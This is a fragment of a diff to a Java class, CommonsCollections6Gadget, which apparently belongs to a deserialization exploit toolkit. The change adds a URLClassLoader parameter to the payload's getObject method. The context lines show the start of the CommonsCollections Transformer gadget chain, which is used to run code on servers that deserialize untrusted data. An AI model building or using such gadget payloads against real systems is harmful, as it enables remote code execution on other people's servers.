@@ -64,7 +64,7 @@ public class CommonsCollections6Gadget implements ObjectPayload<Serializable> {
      * @throws Exception
      */
     @Override
-    public Serializable getObject(final byte[] codeByte, final String[] bootArgs, String className) throws Exception {
+    public Serializable getObject(final byte[] codeByte, final String[] bootArgs, String className, URLClassLoader urlClassLoader) throws Exception {
         final Transformer[] transformers = new Transformer[] {
                 new ConstantTransformer(DefiningClassLoader.class),
                 new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
